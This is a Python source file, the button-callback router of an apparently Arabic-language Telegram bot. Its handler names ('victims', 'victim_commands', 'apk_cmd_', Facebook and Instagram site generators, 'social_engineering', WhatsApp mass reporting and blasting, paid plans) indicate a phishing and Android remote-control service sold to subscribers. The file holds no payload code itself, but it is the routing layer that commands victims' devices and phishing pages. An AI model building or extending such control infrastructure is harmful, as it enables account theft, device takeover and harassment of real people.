# bot_handlers/callbacks/router.py
# ============================================================
# Router v6.4 — مع Broadcast Tool
# ============================================================

from config import bot
from logging_config import get_logger
from monitoring import metrics

logger = get_logger("bot_handlers.callbacks.router")

from . import help as help_cb
from . import search as search_cb
from . import facebook as fb_cb
from . import instagram as ig_cb
from . import silent as silent_cb
from . import dashboard as dash_cb
from . import victims as victims_cb
from . import victim_commands as vcmd_cb
from . import apk_commands as apk_cmd_cb
from . import updates as upd_cb
from . import payment as payment_cb
from . import admin as admin_cb
from . import misc as misc_cb
from . import social_engineering as se_cb
from . import points as points_cb

# ═══ WhatsApp Report ═══
try:
    from . import wa_report as wa_report_cb
    WA_REPORT_AVAILABLE = True
    logger.info("[router] WhatsApp Report handler loaded")
except Exception as e:
    WA_REPORT_AVAILABLE = False
    logger.exception(f"[router] WhatsApp Report NOT available: {e}")

    def _wa_report_fallback(call, chat_id, user_id, data):
        bot.answer_callback_query(call.id, "❌ WhatsApp Report غير متاح", show_alert=True)

    class _FakeWA:
        handle = staticmethod(_wa_report_fallback)
    wa_report_cb = _FakeWA()


# ═══ WhatsApp Blast ═══
try:
    from admin_tools.whatsapp_blast.bot_handlers_real import handle_wb_callback
    WB_AVAILABLE = True
    logger.info("[router] WhatsApp Blast handler loaded")
except Exception as e:
    WB_AVAILABLE = False
    logger.warning(f"[router] WhatsApp Blast not available: {e}")

    def handle_wb_callback(call, chat_id, user_id, data):
        bot.answer_callback_query(call.id, "❌ WhatsApp Blast غير متاح", show_alert=True)


# ═══ Force Subscribe ═══
try:
    from force_subscribe import (
        is_subscribed,
        build_subscribe_message,
        check_all_channels,
        handle_fs_check_callback,
    )
    FS_AVAILABLE = True
    logger.info("[router] Force Subscribe loaded")
except Exception as e:
    FS_AVAILABLE = False
    logger.warning(f"[router] Force Subscribe NOT available: {e}")

    def is_subscribed(user_id):
        return True

    def build_subscribe_message(missing, name=""):
        from telebot.types import InlineKeyboardMarkup
        return "اشترك في القناة", InlineKeyboardMarkup()

    def check_all_channels(user_id):
        return True, []

    def handle_fs_check_callback(call):
        try:
            bot.answer_callback_query(call.id, "❌ خدمة التحقق غير متاحة", show_alert=True)
        except Exception:
            pass


# ============================================================
# ⚡ Broadcast Callback Handler
# ============================================================
def _handle_broadcast_callback(call, chat_id, user_id, data):
    """يوجه الـ callbacks للـ broadcast_tool"""
    try:
        from broadcast_tool import (
            handle_bc_cancel,
            handle_bc_stats,
            handle_bc_back,
            handle_bc_confirm_send,
        )

        if data == "bc_cancel":
            handle_bc_cancel(call)
        elif data == "bc_stats":
            handle_bc_stats(call)
        elif data == "bc_back":
            handle_bc_back(call)
        elif data == "bc_confirm_send":
            handle_bc_confirm_send(call)

    except Exception as e:
        logger.exception(f"broadcast callback error: {e}")
        try:
            bot.answer_callback_query(call.id, f"❌ خطأ: {str(e)[:100]}", show_alert=True)
        except Exception:
            pass


# ============================================================
# ROUTES — الترتيب مهم جداً!
# ============================================================
ROUTES = [
    # ═══════════════════════════════════════════════════════
    # [0] WhatsApp Report
    # ═══════════════════════════════════════════════════════
    (lambda d: d == "wa_report_start"
              or d == "wa_report_help"
              or d == "wa_report_templates"
              or d == "wa_report_history"
              or d.startswith("wa_reason_")
              or d.startswith("wa_blast_")
              or d.startswith("wa_report_sent_")
              or d.startswith("wa_report_finish_"),
     wa_report_cb.handle),

    # ═══════════════════════════════════════════════════════
    # ⚡ [0.5] Broadcast Tool
    # ═══════════════════════════════════════════════════════
    (lambda d: d in ("bc_cancel", "bc_stats", "bc_back", "bc_confirm_send"),
     _handle_broadcast_callback),

    # ═══════════════════════════════════════════════════════
    # [1] WhatsApp Blast
    # ═══════════════════════════════════════════════════════
    (lambda d: d == "admin_wb_menu" or d.startswith("wbr_"), handle_wb_callback),

    # ═══════════════════════════════════════════════════════
    # [2] Points / Settings
    # ═══════════════════════════════════════════════════════
    (lambda d: d == "settings_menu"
              or d == "points_menu"
              or d.startswith("my_referral")
              or d.startswith("points_")
              or d == "how_to_earn"
              or d == "my_referrals"
              or d.startswith("tool_confirm_"), points_cb.handle),

    # ═══════════════════════════════════════════════════════
    # [3] Social Engineering
    # ═══════════════════════════════════════════════════════
    (lambda d: d == "gen_se" or d.startswith("se_"), se_cb.handle),

    # ═══════════════════════════════════════════════════════
    # [4] Misc
    # ═══════════════════════════════════════════════════════
    (lambda d: d == "noop", misc_cb.handle),
    (lambda d: d == "back_to_main", misc_cb.handle),

    # ═══════════════════════════════════════════════════════
    # [5] Help
    # ═══════════════════════════════════════════════════════
    (lambda d: d == "help_guide" or d.startswith("help_page_"), help_cb.handle),

    # ═══════════════════════════════════════════════════════
    # [6] Search
    # ═══════════════════════════════════════════════════════
    (lambda d: d == "search_menu" or d.startswith("search_"), search_cb.handle),

    # ═══════════════════════════════════════════════════════
    # [7] Facebook
    # ═══════════════════════════════════════════════════════
    (lambda d: d == "gen_fb" 
              or d == "fb_show_panel"
              or d.startswith("fb_site_") 
              or d.startswith("fb_stats_"), fb_cb.handle),

    # ═══════════════════════════════════════════════════════
    # [8] Instagram
    # ═══════════════════════════════════════════════════════
    (lambda d: d == "gen_ig" 
              or d == "ig_show_panel"
              or d.startswith("ig_site_") 
              or d.startswith("ig_stats_"), ig_cb.handle),

    # ═══════════════════════════════════════════════════════
    # [9] Silent
    # ═══════════════════════════════════════════════════════
    (lambda d: d in ("gen_silent", "silent_new", "silent_stats", "silent_recent"), silent_cb.handle),

    # ═══════════════════════════════════════════════════════
    # [10] Dashboard
    # ═══════════════════════════════════════════════════════
    (lambda d: d == "open_dashboard", dash_cb.handle),

    # ═══════════════════════════════════════════════════════
    # [11] Payment
    # ═══════════════════════════════════════════════════════
    (lambda d: d in ("payment_menu", "show_plans", "my_account") or d.startswith("buy_plan_"), payment_cb.handle),

    # ═══════════════════════════════════════════════════════
    # [12] Updates
    # ═══════════════════════════════════════════════════════
    (lambda d: d.startswith("upd_"), upd_cb.handle),

    # ═══════════════════════════════════════════════════════
    # [13] Admin
    # ═══════════════════════════════════════════════════════
    (lambda d: d == "admin_panel" or d.startswith("admin_"), admin_cb.handle),

    # ═══════════════════════════════════════════════════════
    # [14] Victim Commands
    # ═══════════════════════════════════════════════════════
    (lambda d: d.startswith("vcmd_"), vcmd_cb.handle),
    (lambda d: d.startswith("apk_cmd_"), apk_cmd_cb.handle),
    (lambda d: d.startswith("v_"), victims_cb.handle),
]


# ============================================================
# Callback Handler الرئيسي
# ============================================================
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    data = call.data

    logger.info(f"[CALLBACK] user={user_id} | data='{data}'")

    # ═══════════════════════════════════════════════════
    # ⚡ fs_check — ننفذ الدالة مباشرة
    # ═══════════════════════════════════════════════════
    if data == "fs_check":
        logger.info("[CALLBACK] fs_check → calling handler directly")
        try:
            handle_fs_check_callback(call)
        except Exception as e:
            logger.exception(f"fs_check handler error: {e}")
            try:
                bot.answer_callback_query(
                    call.id,
                    "❌ حدث خطأ، حاول تاني",
                    show_alert=True
                )
            except Exception:
                pass
        return

    # ═══════════════════════════════════════════════════
    # ★ Force Subscribe Check (لأي زر تاني)
    # ═══════════════════════════════════════════════════
    if FS_AVAILABLE:
        try:
            if not is_subscribed(user_id):
                try:
                    _, missing = check_all_channels(user_id)
                    text, m = build_subscribe_message(
                        missing,
                        call.from_user.first_name or ""
                    )

                    bot.answer_callback_query(
                        call.id,
                        "🔒 لازم تشترك في القناة أولاً",
                        show_alert=True
                    )

                    try:
                        bot.send_message(
                            chat_id, text,
                            reply_markup=m,
                            parse_mode="HTML",
                            disable_web_page_preview=True
                        )
                    except Exception as e:
                        logger.warning(f"send fs msg error: {e}")

                except Exception as e:
                    logger.warning(f"fs build error: {e}")

                return
        except Exception as e:
            logger.warning(f"fs check in callback error: {e}")

    # ═══════════════════════════════════════════════════
    # Routes
    # ═══════════════════════════════════════════════════
    try:
        for idx, (matcher, handler) in enumerate(ROUTES):
            try:
                if matcher(data):
                    logger.info(f"[CALLBACK] matched route #{idx} for '{data}'")
                    handler(call, chat_id, user_id, data)
                    return
            except Exception as e:
                err_str = str(e).lower()
                if "query is too old" in err_str or "query id is invalid" in err_str:
                    logger.warning(f"[CALLBACK] route #{idx} — query expired for '{data}'")
                else:
                    logger.exception(f"[CALLBACK] route #{idx} error for '{data}': {e}")
                continue

        logger.warning(f"[CALLBACK] ⚠️ Unhandled callback: '{data}'")
        try:
            bot.answer_callback_query(call.id)
        except Exception as e:
            if "query is too old" not in str(e).lower():
                logger.debug(f"answer_callback_query failed: {e}")

    except Exception as e:
        err_str = str(e).lower()
        if "query is too old" not in err_str:
            logger.exception(f"[CALLBACK] handler error: {e}")
        metrics.inc_counter("bot_errors", tags={"type": "callback"})
